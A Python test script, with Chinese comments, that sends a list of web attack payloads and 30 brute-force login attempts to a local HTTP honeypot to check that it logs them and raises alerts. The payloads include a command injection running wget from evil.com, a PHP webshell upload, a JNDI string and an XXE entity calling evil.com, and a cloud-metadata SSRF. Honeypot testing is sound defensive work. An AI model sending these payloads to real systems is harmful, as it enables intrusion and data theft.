import requests
import time
import sys

# 基础配置
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8888
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# ==========================================
# 1. 漏洞利用测试载荷
# ==========================================
VULNERABILITY_TESTS = [
    {
        "name": "SQL注入 (SQL Injection)",
        "method": "GET",
        "path": "/product?id=1' UNION SELECT 1,2,3--",
        "headers": {},
        "data": None
    },
    {
        "name": "跨站脚本攻击 (XSS)",
        "method": "GET",
        "path": "/search?q=<script>alert('XSS')</script>",
        "headers": {},
        "data": None
    },
    {
        "name": "目录遍历 (Path Traversal)",
        "method": "GET",
        "path": "/download?file=../../../../etc/passwd",
        "headers": {},
        "data": None
    },
    {
        "name": "命令注入 (Command Injection)",
        "method": "GET",
        "path": "/ping?ip=127.0.0.1; wget http://evil.com/shell.sh",
        "headers": {},
        "data": None
    },
    {
        "name": "敏感信息泄露 (Information Disclosure)",
        "method": "GET",
        "path": "/.env",
        "headers": {},
        "data": None
    },
    {
        "name": "扫描探测 (Nmap 扫描)",
        "method": "GET",
        "path": "/",
        "headers": {"User-Agent": "Mozilla/5.0 (compatible; nmap Scripting Engine; https://nmap.org/book/nse.html)"},
        "data": None
    },
    {
        "name": "WebShell 上传尝试",
        "method": "POST",
        "path": "/upload.php",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": {"file": "evil.php", "content": "<?php system($_POST['cmd']); ?>"}
    },
    {
        "name": "远程代码执行 (RCE)",
        "method": "POST",
        "path": "/api/execute",
        "headers": {"Content-Type": "application/json"},
        "data": '{"query": "${jndi:ldap://evil.com/a}"}'
    },
    {
        "name": "文件包含 (File Inclusion)",
        "method": "GET",
        "path": "/index.php?file=php://filter/read=convert.base64-encode/resource=index.php",
        "headers": {},
        "data": None
    },
    {
        "name": "SSRF尝试 (SSRF)",
        "method": "GET",
        "path": "/proxy?url=http://169.254.169.254/latest/meta-data/",
        "headers": {},
        "data": None
    },
    {
        "name": "XXE外部实体注入 (XXE)",
        "method": "POST",
        "path": "/xml-rpc",
        "headers": {"Content-Type": "application/xml"},
        "data": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe;]>'
    },
    {
        "name": "LDAP注入 (LDAP Injection)",
        "method": "GET",
        "path": "/login?user=admin)(|(objectClass=*)",
        "headers": {},
        "data": None
    },
    {
        "name": "反序列化攻击 (Insecure Deserialization)",
        "method": "POST",
        "path": "/api/object",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": {"payload": "O:8:\"stdClass\":0:{}"}
    },
    {
        "name": "CRLF注入 (CRLF Injection)",
        "method": "GET",
        "path": "/redirect?url=http://example.com%0d%0aSet-Cookie:session_id=123",
        "headers": {},
        "data": None
    }
]

def run_vulnerability_tests():
    print(f"\n[*] 开始执行 HTTP 漏洞利用测试 (目标: {BASE_URL})")
    print("=" * 60)
    for test in VULNERABILITY_TESTS:
        print(f"[-] 正在测试: {test['name']}")
        url = BASE_URL + test["path"]
        try:
            if test["method"] == "GET":
                response = requests.get(url, headers=test["headers"], timeout=3)
            elif test["method"] == "POST":
                response = requests.post(url, headers=test["headers"], data=test["data"], timeout=3)
            
            # 备注：蜜罐返回 404 是正常现象，只要请求发出去且能被蜜罐后端捕获即可
            msg = " (正常, 攻击行为已被蜜罐记录)" if response.status_code == 404 else ""
            print(f"    [+] 状态码: {response.status_code}{msg}")
            
            time.sleep(0.5)
        except requests.exceptions.RequestException as e:
            print(f"    [!] 请求失败: {e}")
        except KeyboardInterrupt:
            print("\n[!] 用户手动中止测试")
            break

# ==========================================
# 2. 暴力破解测试
# ==========================================
def run_brute_force_test(attempts=30):
    print(f"\n[*] 开始执行 HTTP 暴力破解测试 (目标: {BASE_URL}/login)")
    print(f"[*] 设定次数: 1分钟内 {attempts} 次")
    print("=" * 60)
    
    url = f"{BASE_URL}/login"
    success_count = 0
    
    start_time = time.time()
    
    for i in range(1, attempts + 1):
        username = f"admin{i}"
        password = f"pass{i}"
        
        try:
            # 蜜罐接收 POST 请求表单中的 username 和 password
            response = requests.post(url, data={"username": username, "password": password}, timeout=2)
            success_count += 1
            sys.stdout.write(f"\r    [+] 进度: {i}/{attempts} (状态: {response.status_code})")
            sys.stdout.flush()
            
            # 适当的微小延时，确保系统能处理完
            time.sleep(0.1)
        except requests.exceptions.RequestException as e:
            print(f"\n    [!] 第 {i} 次请求失败: {e}")
            break
        except KeyboardInterrupt:
            print("\n[!] 暴力破解测试中途被手动中止")
            break

    end_time = time.time()
    time_taken = end_time - start_time
    
    print(f"\n\n[*] 暴力破解测试完成!")
    print(f"    [+] 成功发送: {success_count}/{attempts} 个请求")
    print(f"    [+] 总耗时: {time_taken:.2f} 秒 (频率符合要求)")
    print(f"    [+] 提示: 请前往仪表盘或日志界面检查是否成功触发 [暴力破解] 告警 (阈值为20次/分钟)")

if __name__ == "__main__":
    print(f"[*] HTTP 蜜罐综合测试脚本启动")
    
    # 检查目标连通性
    try:
        requests.get(BASE_URL, timeout=3)
    except requests.exceptions.ConnectionError:
        print(f"[!] 无法连接到目标蜜罐 {BASE_URL}，请检查蜜罐进程是否已启动！")
        sys.exit(1)
        
    run_vulnerability_tests()
    run_brute_force_test(attempts=30)
    print("\n[*] 测试全部结束。")
